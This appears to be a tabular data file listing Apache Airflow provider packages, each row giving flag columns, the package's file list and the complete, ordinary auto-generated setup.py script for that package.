            setup_kwargs['packages'] = find_namespace_packages(include=['airflow*'])

    include_provider_namespace_packages_when_installing_from_sources()
    if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
        print(""Installing providers from sources. Skip adding providers as dependencies"")
    else:
        add_all_provider_packages()

    write_version()
    setup(
        distclass=AirflowDistribution,
        version=version,
        extras_require=EXTRAS_REQUIREMENTS,
        download_url=('https://archive.apache.org/dist/airflow/' + version),
        cmdclass={
            'extra_clean': CleanCommand,
            'compile_assets': CompileAssets,
            'list_extras': ListExtras,
            'install': Install,  # type: ignore
            'develop': Develop,
        },
        test_suite='setup.airflow_test_suite',
        **setup_kwargs,  # type: ignore
    )


if __name__ == ""__main__"":
    do_setup()  # comment
",0
apache-airflow-backport-providers-amazon-2021.3.3,0,1,1,1,1,0,0,0,example_datasync_1.py example_datasync_2.py example_ecs_fargate.py example_emr_job_flow_automatic_steps.py example_emr_job_flow_manual_steps.py example_glacier_to_gcs.py example_google_api_to_s3_transfer_advanced.py example_google_api_to_s3_transfer_basic.py example_imap_attachment_to_s3.py example_s3_bucket.py example_s3_to_redshift.py __init__.py athena.py aws_dynamodb.py base_aws.py batch_client.py batch_waiters.json batch_waiters.py cloud_formation.py datasync.py dynamodb.py ec2.py elasticache_replication_group.py emr.py glacier.py glue.py glue_catalog.py glue_crawler.py kinesis.py lambda_function.py logs.py redshift.py s3.py sagemaker.py secrets_manager.py ses.py sns.py sqs.py step_function.py __init__.py cloudwatch_task_handler.py s3_task_handler.py __init__.py athena.py batch.py cloud_formation.py datasync.py ec2_start_instance.py ec2_stop_instance.py ecs.py emr_add_steps.py emr_create_job_flow.py emr_modify_cluster.py emr_terminate_job_flow.py glacier.py glue.py glue_crawler.py s3_bucket.py s3_copy_object.py s3_delete_objects.py s3_file_transform.py s3_list.py sagemaker_base.py sagemaker_endpoint.py sagemaker_endpoint_config.py sagemaker_model.py sagemaker_processing.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sns.py sqs.py step_function_get_execution_output.py step_function_start_execution.py __init__.py secrets_manager.py systems_manager.py __init__.py athena.py cloud_formation.py ec2_instance_state.py emr_base.py emr_job_flow.py emr_step.py glacier.py glue.py glue_catalog_partition.py glue_crawler.py redshift.py s3_key.py s3_keys_unchanged.py s3_prefix.py sagemaker_base.py sagemaker_endpoint.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sqs.py step_function_execution.py __init__.py dynamodb_to_s3.py exasol_to_s3.py gcs_to_s3.py glacier_to_gcs.py google_api_to_s3.py hive_to_dynamodb.py imap_attachment_to_s3.py mongo_to_s3.py mysql_to_s3.py redshift_to_s3.py s3_to_ftp.py s3_to_redshift.py s3_to_sftp.py sftp_to_s3.py __init__.py emailer.py redshift.py __init__.py __init__.py email.py typing_compat.py __init__.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-amazon package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-amazon setup.""""""
    setup(
        name='apache-airflow-backport-providers-amazon',
        description='Backport provider package '
        'apache-airflow-backport-providers-amazon for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.amazon', 'airflow.providers.amazon.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'boto3>=1.15.0,<1.16.0',
            'botocore>=1.18.0,<1.19.0',
            'watchtower~=0.7.3',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={
            'apache.hive': ['apache-airflow-backport-providers-apache-hive'],
            'exasol': ['apache-airflow-backport-providers-exasol'],
            'ftp': ['apache-airflow-backport-providers-ftp'],
            'google': ['apache-airflow-backport-providers-google'],
            'imap': ['apache-airflow-backport-providers-imap'],
            'mongo': ['apache-airflow-backport-providers-mongo'],
            'mysql': ['apache-airflow-backport-providers-mysql'],
            'postgres': ['apache-airflow-backport-providers-postgres'],
            'ssh': ['apache-airflow-backport-providers-ssh'],
        },
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-backport-providers-cncf-kubernetes-2021.3.3,0,1,1,1,1,0,0,0,backwards_compat_converters.py __init__.py example_kubernetes.py example_spark_kubernetes.py example_spark_kubernetes_spark_pi.yaml __init__.py kubernetes.py __init__.py kubernetes_pod.py spark_kubernetes.py __init__.py spark_kubernetes.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-cncf-kubernetes package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-cncf-kubernetes setup.""""""
    setup(
        name='apache-airflow-backport-providers-cncf-kubernetes',
        description='Backport provider package '
        'apache-airflow-backport-providers-cncf-kubernetes for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.cncf.kubernetes', 'airflow.providers.cncf.kubernetes.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow>=1.10.12, <2.0.0',
            'cryptography>=2.0.0',
            'kubernetes>=3.0.0, <12.0.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-backport-providers-http-2021.4.10,0,1,1,1,1,0,0,0,example_http.py __init__.py http.py __init__.py http.py __init__.py http.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-http package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.4.10'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-http setup.""""""
    setup(
        name='apache-airflow-backport-providers-http',
        description='Backport provider package ' 'apache-airflow-backport-providers-http for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.http', 'airflow.providers.http.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-backport-providers-microsoft-azure-2021.3.13,0,1,1,1,1,0,1,0,__init CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO README.md README.rst,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-microsoft-azure package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.13'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-microsoft-azure setup.""""""
    setup(
        name='apache-airflow-backport-providers-microsoft-azure',
        description='Backport provider package '
        'apache-airflow-backport-providers-microsoft-azure for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.azure', 'airflow.providers.microsoft.azure.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'azure-batch>=8.0.0',
            'azure-cosmos>=3.0.1,<4',
            'azure-datalake-store>=0.0.45',
            'azure-identity>=1.3.1',
            'azure-keyvault>=4.1.0',
            'azure-kusto-data>=0.0.43,<0.1',
            'azure-mgmt-containerinstance>=1.5.0,<2.0',
            'azure-mgmt-datafactory>=1.0.0,<2.0',
            'azure-mgmt-datalake-store>=0.5.0',
            'azure-mgmt-resource>=2.2.0',
            'azure-storage-blob>=12.7.0',
            'azure-storage-common>=2.1.0',
            'azure-storage-file>=2.1.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={
            'google': ['apache-airflow-backport-providers-google'],
            'oracle': ['apache-airflow-backport-providers-oracle'],
        },
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-backport-providers-snowflake-2021.3.13,0,1,1,1,1,0,0,0,examp __ini snowflake.py __init__.py snowflak __init__ s3_to_sn snowflak __init__ __init__.py CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-snowflake package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.13'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-snowflake setup.""""""
    setup(
        name='apache-airflow-backport-providers-snowflake',
        description='Backport provider package '
        'apache-airflow-backport-providers-snowflake for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.snowflake', 'airflow.providers.snowflake.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'snowflake-connector-python>=2.4.1',
            'snowflake-sqlalchemy>=1.1.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={'slack': ['apache-airflow-backport-providers-slack']},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-backport-providers-ssh-2021.3.3,0,1,1,1,1,0,0,0,ssh.py __init__.py ssh.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-ssh package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-ssh setup.""""""
    setup(
        name='apache-airflow-backport-providers-ssh',
        description='Backport provider package ' 'apache-airflow-backport-providers-ssh for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.ssh', 'airflow.providers.ssh.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'paramiko>=2.6.0',
            'pysftp>=0.2.9',
            'sshtunnel>=0.1.4,<0.2',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-airbyte-3.1.0,0,1,1,1,1,0,0,0,example_airbyte_trigger_job.py __init__.py get_provider_info.py airbyte.py __init__.py airbyte.py __init__.py airbyte.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-airbyte package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-airbyte setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.airbyte', 'airflow.providers.airbyte.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-amazon-4.1.0,1,1,1,1,1,0,0,0,example_appflow.py example_batch.py example_datasync.py example_dms.py example_dynamodb_to_s3.py example_ec2.py example_ecs.py example_ecs_fargate.py example_eks_templated.py example_eks_with_fargate_in_one_step.py example_eks_with_fargate_profile.py example_eks_with_nodegroups.py example_eks_with_nodegroup_in_one_step.py example_emr.py example_emr_eks.py example_ftp_to_s3.py example_gcs_to_s3.py example_glacier_to_gcs.py example_glue.py example_google_api_sheets_to_s3.py example_google_api_youtube_to_s3.py example_hive_to_dynamodb.py example_imap_attachment_to_s3.py example_lambda.py example_local_to_s3.py example_mongo_to_s3.py example_quicksight.py example_rds_export.py example_redshift_cluster.py example_redshift_data_execute_sql.py example_redshift_sql.py example_redshift_to_s3.py example_s3.py example_s3_to_ftp.py example_s3_to_redshift.py example_s3_to_sftp.py example_sagemaker.py example_sagemaker_endpoint.py example_salesforce_to_s3.py example_sftp_to_s3.py example_sql_to_s3.py __init__.py exceptions.py appflow.py athena.py aws_dynamodb.py base_aws.py batch_client.py batch_waiters.json batch_waiters.py cloud_formation.py datasync.py dms.py dynamodb.py ec2.py eks.py elasticache_replication_group.py emr.py emr_containers.py glacier.py glue.py glue_catalog.py glue_crawler.py kinesis.py lambda_function.py logs.py quicksight.py rds.py redshift.py redshift_cluster.py redshift_data.py redshift_sql.py s3.py sagemaker.py secrets_manager.py ses.py sns.py sqs.py step_function.py sts.py __init__.py base_aws.py batch.py emr.py logs.py __init__.py cloudwatch_task_handler.py s3_task_handler.py __init__.py appflow.py athena.py aws_lambda.py batch.py cloud_formation.py datasync.py dms.py dms_create_task.py dms_delete_task.py dms_describe_tasks.py dms_start_task.py dms_stop_task.py ec2.py ec2_start_instance.py ec2_stop_instance.py ecs.py eks.py emr.py emr_add_steps.py emr_containers.py emr_create_job_flow.py emr_modify_cluster.py emr_terminate_job_flow.py glacier.py glue.py glue_crawler.py quicksight.py rds.py redshift.py redshift_cluster.py redshift_data.py redshift_sql.py s3.py s3_bucket.py s3_bucket_tagging.py s3_copy_object.py s3_delete_objects.py s3_file_transform.py s3_list.py s3_list_prefixes.py sagemaker.py sagemaker_base.py sagemaker_endpoint.py sagemaker_endpoint_config.py sagemaker_model.py sagemaker_processing.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sns.py sqs.py step_function.py step_function_get_execution_output.py step_function_start_execution.py __init__.py secrets_manager.py systems_manager.py __init__.py athena.py batch.py cloud_formation.py dms.py dms_task.py ec2.py ec2_instance_state.py eks.py emr.py emr_base.py emr_containers.py emr_job_flow.py emr_step.py glacier.py glue.py glue_catalog_partition.py glue_crawler.py quicksight.py rds.py redshift.py redshift_cluster.py s3.py s3_key.py s3_keys_unchanged.py s3_prefix.py sagemaker.py sagemaker_base.py sagemaker_endpoint.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sqs.py step_function.py step_function_execution.py __init__.py dynamodb_to_s3.py exasol_to_s3.py ftp_to_s3.py gcs_to_s3.py glacier_to_gcs.py google_api_to_s3.py hive_to_dynamodb.py imap_attachment_to_s3.py local_to_s3.py mongo_to_s3.py mysql_to_s3.py redshift_to_s3.py s3_to_ftp.py s3_to_redshift.py s3_to_sftp.py salesforce_to_s3.py sftp_to_s3.py sql_to_s3.py __init__.py eks_get_token.py emailer.py rds.py redshift.py __init__.py __init__.py get_provider_info.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-amazon package.""""""

from setuptools import find_namespace_packages, setup

version = '4.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-amazon setup.""""""
    setup(
        version=version,
        extras_require={
            'apache.hive': ['apache-airflow-providers-apache-hive'],
            'cncf.kubernetes': ['apache-airflow-providers-cncf-kubernetes'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'exasol': ['apache-airflow-providers-exasol'],
            'ftp': ['apache-airflow-providers-ftp'],
            'google': ['apache-airflow-providers-google'],
            'imap': ['apache-airflow-providers-imap'],
            'mongo': ['apache-airflow-providers-mongo'],
            'salesforce': ['apache-airflow-providers-salesforce'],
            'ssh': ['apache-airflow-providers-ssh'],
        },
        packages=find_namespace_packages(include=['airflow.providers.amazon', 'airflow.providers.amazon.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-apache-hdfs-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py hdfs.py webhdfs.py __init__.py hdfs.py web_hdfs.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-hdfs package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'

def do_setup():
